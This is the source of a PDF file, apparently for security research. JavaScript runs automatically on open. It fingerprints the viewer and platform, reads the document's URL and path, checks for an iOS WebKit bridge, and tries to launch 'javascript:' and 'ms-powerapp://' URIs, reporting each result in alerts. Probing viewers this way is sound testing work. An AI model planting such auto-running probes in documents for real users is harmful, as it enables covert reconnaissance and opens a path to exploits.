%PDF-1.7
% Combined Probe PDF - Basic + Viewer + Location + WebView + URI - Jan 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj
3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      app.alert("2: Viewer Info\\nType: " + vt + "\\nVer: " + vv + "\\nPlat: " + plat + "\\nLang: " + lang);

      // Viewer & platform probe
      try {
         var vt = app.viewerType || "undef";
         var vv = app.viewerVersion || "undef";
         var plat = app.platform || "undef";
         var lang = app.language || "undef";
         app.alert("2: Viewer Info\\nType: " + vt + "\\nVer: " + vv + "\\nPlat: " + plat + "\\nLang: " + lang);
      } catch (e) {
         app.alert("2: Viewer error - " + e);
      }

      // Doc location info (potential blob URL leak)
      try {
         var url = this.URL || "n/a";
         var path = this.path || "n/a";
         app.alert("3: Doc Location\\nURL: " + url + "\\nPath: " + path);
      } catch (e) {
         app.alert("3: Location error - " + e);
      }

      // Page count
      try {
         app.alert("4: Pages - " + this.numPages);
      } catch (e) {
         app.alert("4: Pages error - " + e);
      }

      // iOS WebView bridge probe
      try {
         if (typeof window !== "undefined" && window.webkit && window.webkit.messageHandlers) {
            app.alert("5: WebKit Bridge DETECTED!");
         } else {
            app.alert("5: No WebKit Bridge detected");
         }
      } catch (e) {
         app.alert("5: WebKit probe error - " + e);
      }

      // launchURL for javascript: scheme test
      try {
         app.launchURL("javascript:alert('6: JS via launchURL URI test!')", true);
         app.alert("6: launchURL JS call attempted");
      } catch (e) {
         app.alert("6: launchURL JS error - " + e);
      }

      // launchURL for ms-powerapp scheme test
      try {
         app.launchURL("ms-powerapp://callback?probe=pdf-test", true);
         app.alert("7: ms-powerapp scheme attempted");
      } catch (e) {
         app.alert("7: ms-powerapp error - " + e);
      }
   )
>>
endobj
4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj
5 0 obj
<< /Length 100 >>
stream
BT /F1 14 Tf 50 250 Td (Combined Probe PDF) Tj ET
BT /F1 12 Tf 50 220 Td (Open for alerts - check sequence on mobile) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000130 00000 n 
0000000300 00000 n 
0000000450 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
550
%%EOF